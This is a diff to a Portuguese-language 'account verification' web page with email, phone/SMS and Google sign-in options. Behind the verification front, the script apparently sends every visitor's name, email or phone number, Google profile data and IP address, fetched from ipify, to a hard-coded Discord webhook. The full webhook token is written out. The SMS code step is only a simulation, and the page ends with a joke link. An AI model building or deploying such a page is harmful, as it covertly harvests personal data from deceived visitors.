@@ -1,5 +1,3 @@
-
-</body>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -25,7 +23,48 @@
         h1 {
             text-align: center;
             color: #333;
-            margin-bottom: 30px;
+            margin-bottom: 10px;
+        }
+        
+        .login-methods {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .login-methods::after {
+            content: "";
+            display: block;
+            width: 90%;
+            height: 1px;
+            background-color: #ddd;
+            margin: 15px auto;
+        }
+        
+        .method-options {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .method-tab {
+            padding: 8px 15px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .method-tab.active {
+            border-bottom: 2px solid #4285F4;
+            font-weight: bold;
+        }
+        
+        .form-step {
+            display: none;
+        }
+        
+        .form-step.active {
+            display: block;
         }
         
         .form-group {
@@ -38,19 +77,12 @@
             font-weight: bold;
         }
         
-        input[type="text"],
-        input[type="email"] {
+        input {
             width: 100%;
             padding: 10px;
             border: 1px solid #ddd;
             border-radius: 5px;
             font-size: 16px;
-        }
-        
-        .login-options {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
         }
         
         .btn {
@@ -64,16 +96,21 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
+            width: 100%;
         }
         
         .btn-verify {
             background-color: #4CAF50;
             color: white;
-            flex: 1;
         }
         
-        .btn-verify:hover {
-            background-color: #45a049;
+        .btn-verify:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .btn-verify.error {
+            background-color: #f44336;
         }
         
         .btn-google {
@@ -81,6 +118,7 @@
             color: #757575;
             border: 1px solid #ddd;
             padding: 10px 15px;
+            margin-top: 10px;
         }
         
         .btn-google:hover {
@@ -130,34 +168,94 @@
         .loading {
             display: none;
             margin-top: 20px;
+            text-align: center;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 60px;
+            font-size: 24px;
+            text-align: center;
+            border: 1px solid #ddd;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
     <div class="form-container" id="formContainer">
         <h1>Verificação de Conta</h1>
-        <form id="verificationForm">
-            <div class="form-group">
-                <label for="fullName">Nome completo:</label>
-                <input type="text" id="fullName" name="fullName" required>
+        
+        <div class="login-methods">
+            <h3>Métodos de login</h3>
+            <div class="method-options">
+                <div class="method-tab active" data-tab="email">Email</div>
+                <div class="method-tab" data-tab="phone">Número</div>
             </div>
-            
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="login-options">
+        </div>
+        
+        <!-- Formulário de Email -->
+        <div class="form-step active" id="emailStep">
+            <form id="emailForm">
+                <div class="form-group">
+                    <label for="fullName">Nome completo:</label>
+                    <input type="text" id="fullName" name="fullName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
                 <button type="submit" class="btn btn-verify">Verificar</button>
                 <button type="button" id="googleLogin" class="btn btn-google">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+                    Continuar com Google
                 </button>
+            </form>
+        </div>
+        
+        <!-- Formulário de Telefone -->
+        <div class="form-step" id="phoneStep">
+            <form id="phoneForm">
+                <div class="form-group">
+                    <label for="phoneName">Nome completo:</label>
+                    <input type="text" id="phoneName" name="phoneName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phoneNumber">Número de telefone:</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" required>
+                </div>
+                
+                <button type="submit" class="btn btn-verify">Enviar Código</button>
+            </form>
+        </div>
+        
+        <!-- Verificação de Código SMS -->
+        <div class="form-step" id="smsVerificationStep">
+            <h3>Código de verificação</h3>
+            <p>Enviamos um código de 4 dígitos para o número informado</p>
+            
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" data-index="0">
+                <input type="text" class="code-input" maxlength="1" data-index="1">
+                <input type="text" class="code-input" maxlength="1" data-index="2">
+                <input type="text" class="code-input" maxlength="1" data-index="3">
             </div>
             
-            <div class="loading" id="loading">
-                <p>Processando verificação...</p>
-            </div>
-        </form>
+            <button type="button" id="verifyCodeBtn" class="btn btn-verify" disabled>Verificar Código</button>
+            <button type="button" id="resendCodeBtn" class="btn" style="margin-top: 10px;">Reenviar Código</button>
+        </div>
+        
+        <div class="loading" id="loading">
+            <p>Processando verificação...</p>
+        </div>
     </div>
     
     <div class="verification-screen" id="verificationScreen">
@@ -165,12 +263,225 @@
         <a href="https://youtu.be/dQw4w9WgXcQ" class="continue-button">Continuar</a>
     </div>
 
-    <!-- Carrega a API do Google -->
+    <!-- API do Google -->
     <script src="https://accounts.google.com/gsi/client" async defer></script>
     
     <script>
-        // Configuração do Webhook do Discord
+        // Configurações
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m';
+        const GOOGLE_CLIENT_ID = '640154624957-dag7evugi4hdbiqv3khqsvbscg9slmic.apps.googleusercontent.com';
+        
+        // Variáveis globais
+        let currentMethod = 'email';
+        let verificationCode = '';
+        let userPhoneNumber = '';
+        
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            // Troca entre métodos de login
+            document.querySelectorAll('.method-tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    currentMethod = this.getAttribute('data-tab');
+                    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
+                    document.getElementById(`${currentMethod}Step`).classList.add('active');
+                });
+            });
+            
+            // Configuração do Google Sign-In
+            google.accounts.id.initialize({
+                client_id: GOOGLE_CLIENT_ID,
+                callback: handleGoogleLogin
+            });
+            
+            // Envio do formulário de email
+            document.getElementById('emailForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                verifyEmail();
+            });
+            
+            // Envio do formulário de telefone
+            document.getElementById('phoneForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                sendSMSCode();
+            });
+            
+            // Botão de login com Google
+            document.getElementById('googleLogin').addEventListener('click', function() {
+                google.accounts.id.prompt();
+            });
+            
+            // Verificação do código SMS
+            document.getElementById('verifyCodeBtn').addEventListener('click', verifySMSCode);
+            
+            // Reenvio do código SMS
+            document.getElementById('resendCodeBtn').addEventListener('click', sendSMSCode);
+            
+            // Lógica para os inputs de código
+            document.querySelectorAll('.code-input').forEach(input => {
+                input.addEventListener('input', function() {
+                    const nextIndex = parseInt(this.getAttribute('data-index')) + 1;
+                    const nextInput = document.querySelector(`.code-input[data-index="${nextIndex}"]`);
+                    
+                    if (this.value.length === 1 && nextInput) {
+                        nextInput.focus();
+                    }
+                    
+                    checkCodeInputs();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        const prevIndex = parseInt(this.getAttribute('data-index')) - 1;
+                        const prevInput = document.querySelector(`.code-input[data-index="${prevIndex}"]`);
+                        
+                        if (prevInput) {
+                            prevInput.focus();
+                        }
+                    }
+                });
+            });
+        });
+        
+        // Função para verificar email
+        async function verifyEmail() {
+            showLoading(true);
+            
+            const formData = {
+                name: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                method: "Email"
+            };
+            
+            try {
+                // Obter IP do usuário
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                formData.ip = (await ipResponse.json()).ip;
+                
+                // Enviar para o Discord
+                await sendToDiscord(formData);
+                
+                // Mostrar tela de sucesso
+                showVerificationSuccess();
+            } catch (error) {
+                console.error("Erro na verificação:", error);
+                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        // Função para enviar código SMS
+        async function sendSMSCode() {
+            showLoading(true);
+            
+            userPhoneNumber = document.getElementById('phoneNumber').value;
+            const userName = document.getElementById('phoneName').value;
+            
+            // Gerar código de 4 dígitos
+            verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            try {
+                // Aqui você precisaria integrar com um serviço de SMS real como Twilio
+                // Esta é uma simulação - na prática você faria uma chamada para sua API
+                console.log(`Código de verificação para ${userPhoneNumber}: ${verificationCode}`);
+                
+                // Mostrar etapa de verificação
+                document.getElementById('phoneStep').classList.remove('active');
+                document.getElementById('smsVerificationStep').classList.add('active');
+                
+                // Limpar inputs de código
+                document.querySelectorAll('.code-input').forEach(input => input.value = '');
+                document.getElementById('verifyCodeBtn').disabled = true;
+                
+                alert(`SIMULAÇÃO: Código ${verificationCode} enviado para ${userPhoneNumber}`);
+                
+            } catch (error) {
+                console.error("Erro ao enviar SMS:", error);
+                alert("Ocorreu um erro ao enviar o código. Por favor, tente novamente.");
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        // Função para verificar código SMS
+        function verifySMSCode() {
+            showLoading(true);
+            
+            // Obter código digitado
+            let enteredCode = '';
+            document.querySelectorAll('.code-input').forEach(input => {
+                enteredCode += input.value;
+            });
+            
+            // Verificar código
+            if (enteredCode === verificationCode) {
+                // Código correto
+                document.getElementById('verifyCodeBtn').classList.remove('error');
+                
+                // Enviar dados para o Discord
+                const formData = {
+                    name: document.getElementById('phoneName').value,
+                    phone: userPhoneNumber,
+                    method: "SMS"
+                };
+                
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        formData.ip = ipData.ip;
+                        return sendToDiscord(formData);
+                    })
+                    .then(() => {
+                        showVerificationSuccess();
+                    })
+                    .catch(error => {
+                        console.error("Erro:", error);
+                        alert("Ocorreu um erro durante a verificação.");
+                    })
+                    .finally(() => {
+                        showLoading(false);
+                    });
+            } else {
+                // Código incorreto
+                document.getElementById('verifyCodeBtn').classList.add('error');
+                document.getElementById('verifyCodeBtn').disabled = true;
+                alert("Código incorreto. Por favor, tente novamente.");
+                showLoading(false);
+            }
+        }
+        
+        // Função para login com Google
+        async function handleGoogleLogin(response) {
+            showLoading(true);
+            
+            try {
+                // Decodificar token JWT
+                const payload = JSON.parse(atob(response.credential.split('.')[1]));
+                
+                // Obter IP do usuário
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Enviar para o Discord
+                await sendToDiscord({
+                    name: payload.name,
+                    email: payload.email,
+                    method: "Google",
+                    ip: ipData.ip
+                });
+                
+                // Mostrar tela de sucesso
+                showVerificationSuccess();
+            } catch (error) {
+                console.error("Erro no login Google:", error);
+                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
+            } finally {
+                showLoading(false);
+            }
+        }
         
         // Função para enviar dados para o Discord
         async function sendToDiscord(data) {
@@ -179,7 +490,11 @@
                 color: 0x00ff00,
                 fields: [
                     { name: "Nome", value: data.name || "Não fornecido", inline: true },
-                    { name: "Email", value: data.email || "Não fornecido", inline: true },
+                    { 
+                        name: "Contato", 
+                        value: data.email || data.phone || "Não fornecido", 
+                        inline: true 
+                    },
                     { name: "Método", value: data.method || "Email", inline: true },
                     { name: "IP", value: data.ip || "Não detectado", inline: true },
                     { name: "Data", value: new Date().toLocaleString(), inline: true }
@@ -194,86 +509,42 @@
                 });
             } catch (error) {
                 console.error("Erro ao enviar para Discord:", error);
+                throw error;
             }
         }
         
-        // Login com Google
-        document.getElementById('googleLogin').addEventListener('click', () => {
-            // Inicializa o fluxo de autenticação do Google
-            google.accounts.id.initialize({
-                client_id: '640154624957-dag7evugi4hdbiqv3khqsvbscg9slmic.apps.googleusercontent.com', // Substitua pelo seu Client ID
-                callback: handleGoogleLogin
+        // Função para verificar inputs do código
+        function checkCodeInputs() {
+            let codeComplete = true;
+            let enteredCode = '';
+            
+            document.querySelectorAll('.code-input').forEach(input => {
+                if (input.value.length === 0) {
+                    codeComplete = false;
+                }
+                enteredCode += input.value;
             });
             
-            google.accounts.id.prompt();
-        });
-        
-        // Tratamento do login com Google
-        async function handleGoogleLogin(response) {
-            document.getElementById('loading').style.display = 'block';
+            document.getElementById('verifyCodeBtn').disabled = !codeComplete;
             
-            try {
-                // Decodifica o token JWT para obter os dados do usuário
-                const payload = JSON.parse(atob(response.credential.split('.')[1]));
-                
-                // Preenche automaticamente o formulário
-                document.getElementById('fullName').value = payload.name;
-                document.getElementById('email').value = payload.email;
-                
-                // Obtém o IP do usuário
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Envia para o Discord
-                await sendToDiscord({
-                    name: payload.name,
-                    email: payload.email,
-                    method: "Google",
-                    ip: ipData.ip
-                });
-                
-                // Mostra tela de sucesso
-                document.getElementById('formContainer').style.display = 'none';
-                document.getElementById('verificationScreen').style.display = 'flex';
-                
-            } catch (error) {
-                console.error("Erro no login Google:", error);
-                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
-            } finally {
-                document.getElementById('loading').style.display = 'none';
+            // Verificar se o código está errado
+            if (codeComplete && enteredCode !== verificationCode) {
+                document.getElementById('verifyCodeBtn').classList.add('error');
+            } else {
+                document.getElementById('verifyCodeBtn').classList.remove('error');
             }
         }
         
-        // Verificação por email normal
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            document.getElementById('loading').style.display = 'block';
-            
-            try {
-                const formData = {
-                    name: document.getElementById('fullName').value,
-                    email: document.getElementById('email').value,
-                    method: "Email"
-                };
-                
-                // Obtém o IP do usuário
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                formData.ip = (await ipResponse.json()).ip;
-                
-                // Envia para o Discord
-                await sendToDiscord(formData);
-                
-                // Mostra tela de sucesso
-                document.getElementById('formContainer').style.display = 'none';
-                document.getElementById('verificationScreen').style.display = 'flex';
-                
-            } catch (error) {
-                console.error("Erro na verificação:", error);
-                alert("Ocorreu um erro durante a verificação. Por favor, tente novamente.");
-            } finally {
-                document.getElementById('loading').style.display = 'none';
-            }
-        });
+        // Função para mostrar/ocultar loading
+        function showLoading(show) {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+        }
+        
+        // Função para mostrar tela de sucesso
+        function showVerificationSuccess() {
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('verificationScreen').style.display = 'flex';
+        }
     </script>
 </body>
-</html></html>
+    </html>
